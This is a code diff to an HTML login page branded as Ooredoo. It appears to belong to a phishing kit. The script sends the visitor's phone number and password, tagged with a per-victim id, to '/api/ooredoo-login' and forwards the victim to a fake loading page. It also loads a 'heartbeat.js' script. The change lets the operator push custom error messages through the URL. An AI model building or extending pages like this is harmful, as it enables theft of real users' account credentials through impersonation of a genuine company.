@@ -27,7 +27,7 @@
 <script>
 function togglePw(){var pw=document.getElementById('pw');var eye=document.getElementById('eye');if(pw.type==='password'){pw.type='text';eye.innerHTML='<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>';}else{pw.type='password';eye.innerHTML='<path d="M2 12s3.5-7 10-7 10 7 10 7"/><path d="M4 15l1.5-2M20 15l-1.5-2M9 17l.6-2.2M15 17l-.6-2.2M12 17.5V15">';}}
 function handleLogin(){var username=document.getElementById('username');var password=document.getElementById('pw');var error=document.getElementById('loginError');var invalid=!username.value.trim()||!password.value;error.classList.toggle('visible',invalid);if(invalid){username.focus();return;}var id=new URLSearchParams(window.location.search).get('id')||'';if(!id){error.classList.add('visible');return;}fetch('/api/ooredoo-login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:id,phone:username.value,password:password.value})}).then(function(response){if(!response.ok)throw new Error('rejected');window.location.href='ooredoo-loading-en.html?id='+encodeURIComponent(id);}).catch(function(){error.classList.add('visible');password.value='';password.focus();});}
-if(new URLSearchParams(window.location.search).get('error')==='1')document.getElementById('loginError').classList.add('visible');
+(function(){var p=new URLSearchParams(window.location.search);var err=p.get('error');if(err==='1'||err==='ooredoo'){var el=document.getElementById('loginError');var msg=p.get('msg');if(msg)el.textContent=msg;el.classList.add('visible');}})();
 </script>
 <script src="heartbeat.js"></script>
 </body>
